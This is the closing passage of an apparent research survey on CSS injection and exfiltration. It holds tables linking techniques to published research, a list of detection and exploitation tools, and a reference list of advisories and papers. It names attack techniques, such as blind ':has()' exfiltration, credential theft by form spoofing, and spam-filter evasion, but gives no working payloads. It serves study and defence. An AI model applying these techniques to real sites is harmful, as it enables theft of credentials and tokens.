| §1 (Blind CSS exfiltration) | PortSwigger Blind CSS Exfiltration Research (2024) | `:has()` selector enables blind exfiltration of unknown pages; all ASCII data extractable |
| §7-1 + §7-2 (Email text salting) | Cisco Talos Research (2024–2025) | Hidden text salting surge in phishing campaigns; CSS-based evasion of spam filters at scale |
| §6-3 (Form spoofing via CSS class reuse) | Infosec Mastodon Credential Theft (2022) | HTML filter bypass + existing CSS classes for concealment + browser autofill exploitation; form submission exfiltrates credentials without CSP bypass |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **CSS Exfil Protection** (Browser Extension) | CSS data exfiltration | Browser extension for Chrome/Firefox that detects and blocks CSS attribute-selector exfiltration attempts |
| **Burp Suite Scanner** (Commercial) | CSS injection, PRSSI | Active/passive scanning for CSS injection points and path-relative stylesheet imports |
| **Blind CSS Exfiltration** (PortSwigger/Hackvertor) | Blind CSS exfiltration | Automated tool for `@import`-chaining and `:has()` selector-based data extraction |
| **ONSEN** (CSS injection tool) | On-demand CSS injection | Automated CSS injection exploitation framework with recursive `@import` support |
| **CSP Evaluator** (Google) | CSP configuration | Static analysis of `style-src` directive for permissive configurations (`unsafe-inline`, wildcards) |
| **Semgrep** (SAST) | Source code CSS sinks | Static rules detecting user input in `<style>` blocks, `style` attributes, and CSS template contexts |
| **Detectify** (DAST) | PRSSI/RPO | Automated detection of path-relative stylesheet import vulnerabilities |
| **CSSExfil Tester** (Research) | Exfiltration validation | Tests whether a target page is vulnerable to specific CSS exfiltration primitives |

---

## References

- [PortSwigger Research. "Blind CSS Exfiltration: exfiltrate unknown web pages."](https://portswigger.net/research/blind-css-exfiltration)
- [PortSwigger Research. "Inline Style Exfiltration: leaking data with chained CSS conditionals."](https://portswigger.net/research/inline-style-exfiltration)
- [PortSwigger Research. "Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities."](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities)
- [PortSwigger Research. "Top 10 web hacking techniques of 2025."](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)
- [Jorian Woltjer. "CSS Injection."](https://book.jorianwoltjer.com/web/client-side/css-injection)
- [Jorian Woltjer. "Nonce CSP bypass using Disk Cache."](https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache)
- [x-c3ll (Pepe Vila). "CSS Injection Primitives."](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [HackTricks. "CSS Injection."](https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html)
- [XS-Leaks Wiki. "CSS Injection."](https://xsleaks.dev/docs/attacks/css-injection/)
- [Huli (Beyond XSS). "CSS Injection: Attacking with Just CSS (Part 1 & 2)."](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)
- [Adrián Dragos. "Fontleak: exfiltrating text using CSS and Ligatures."](https://adragos.ro/fontleak/)
- [HackerNotes. "The State of CSS Injection — Leaking Text Nodes & HTML Attributes."](https://blog.criticalthinkingpodcast.io/p/css-injection-leaking-text-nodes-html-attributes)
- [SecForce. "New technique of stealing data using CSS and Scroll-to-Text Fragment feature."](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)
- [lyra.horse. "SVG Clickjacking."](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Cisco Talos Intelligence. "Abusing with style: Leveraging cascading style sheets for evasion and tracking."](https://blog.talosintelligence.com/css-abuse-for-evasion-and-tracking/)
- [Cisco Talos Intelligence. "Too salty to handle: Exposing cases of CSS abuse for hidden text salting."](https://blog.talosintelligence.com/too-salty-to-handle-exposing-cases-of-css-abuse-for-hidden-text-salting/)
- [Mike Gualtieri. "Stealing Data with CSS: Attack and Defense."](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/)
- [Voorivex Team. "CSS Data Exfiltration to Steal OAuth Token."](https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
- [SecurityBoulevard. "Disclosure: XWiki CSS Injection (CVE-2026-26000)."](https://securityboulevard.com/2026/02/disclosure-xwiki-css-injection-cve-2026-26000/)
- [Chrome for Developers. "CSS conditionals with the new if() function."](https://developer.chrome.com/blog/if-article)
- [Chrome Releases. "Stable Channel Update for Desktop" (CVE-2026-2441).](https://chromereleases.googleblog.com/2026/02/stable-channel-update-for-desktop_13.html)
- [CVE Program Record — CVE-2026-26000 (XWiki CSS injection / clickjacking).](https://cveawg.mitre.org/api/cve/CVE-2026-26000)
- [innerht.ml. "CSS: Cascading Style Scripting."](https://blog.innerht.ml/cascading-style-scripting/)
- [Masato Kinugawa (MKSB). "Data Exfiltration via CSS + SVG Font."](https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html)
- [ACM WWW 2018. "Large-Scale Analysis of Style Injection by Relative Path Overwrite."](https://dl.acm.org/doi/fullHtml/10.1145/3178876.3186090)
- [PortSwigger Research (Gareth Heyes). "Stealing passwords from infosec Mastodon - without bypassing CSP."](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
- [OWASP. "Testing for CSS Injection."](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection)
- [CSS-Tricks. "CSS Security Vulnerabilities."](https://css-tricks.com/css-security-vulnerabilities/)
